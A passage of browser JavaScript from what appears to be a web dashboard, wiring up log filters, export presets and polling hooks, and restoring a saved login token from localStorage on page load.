    }

    // Filter changes → re-render immediately (no re-fetch; use cached _llAllLogs)
    ["ll-filter-event","ll-filter-method","ll-filter-status"].forEach(id => {
      const el = document.getElementById(id);
      if (el) el.addEventListener("change", _renderLogs);
    });
    const searchInput = document.getElementById("ll-filter-search");
    if (searchInput) {
      searchInput.addEventListener("input", _renderLogs);
    }

    // Clear filters
    const clearBtn = document.getElementById("ll-clear-filters-btn");
    if (clearBtn) {
      clearBtn.addEventListener("click", () => {
        const ev  = document.getElementById("ll-filter-event");
        const mth = document.getElementById("ll-filter-method");
        const st  = document.getElementById("ll-filter-status");
        const sr  = document.getElementById("ll-filter-search");
        if (ev)  ev.value  = "";
        if (mth) mth.value = "";
        if (st)  st.value  = "";
        if (sr)  sr.value  = "";
        _renderLogs();
      });
    }

    // Export preset buttons
    document.querySelectorAll(".ll-export-preset").forEach(btn => {
      btn.addEventListener("click", () => {
        document.querySelectorAll(".ll-export-preset").forEach(b => b.classList.remove("active-filter"));
        btn.classList.add("active-filter");
        _exportPreset = btn.dataset.preset;
        const customRange = document.getElementById("ll-export-custom-range");
        if (customRange) customRange.style.display = _exportPreset === "custom" ? "flex" : "none";
      });
    });

    // Export confirm
    const confirmBtn = document.getElementById("ll-export-confirm-btn");
    if (confirmBtn) {
      confirmBtn.addEventListener("click", _doExport);
    }
  });

  // ── Expose for page navigation hook ───────────────────────────────
  window._llOnPageOpen = function () {
    // Load immediately, then start polling
    if (API_CONFIG.USE_REAL_API) { _fetchLogs(); } else { _mockFetch(); }
    _startPolling();
  };

  window._llOnPageClose = function () {
    _stopPolling();
  };

})();

// =====================================================================
//  INITIAL RENDER — stay on login screen; showPage called after login
// =====================================================================
document.addEventListener("DOMContentLoaded", () => {
  // Restore a persisted session BEFORE any API polling starts.
  // The token is validated server-side by the first authenticated
  // request; apiRequest() force-logs out on a 401 (expired token).
  if (!API_CONFIG.USE_REAL_API) return;

  let stored = null;
  try { stored = localStorage.getItem(_TOKEN_STORAGE_KEY); } catch (_) {}
  if (!stored) return;  // no session — stay on the login screen

  _session.token = stored;

  const loginScreen = document.getElementById("login-screen");
  const appShell    = document.getElementById("app-shell");
  if (loginScreen) loginScreen.style.display = "none";
  if (appShell)    appShell.style.display    = "block";
  showPage("dashboard-page");
  _loadAuthorizedApps();
});
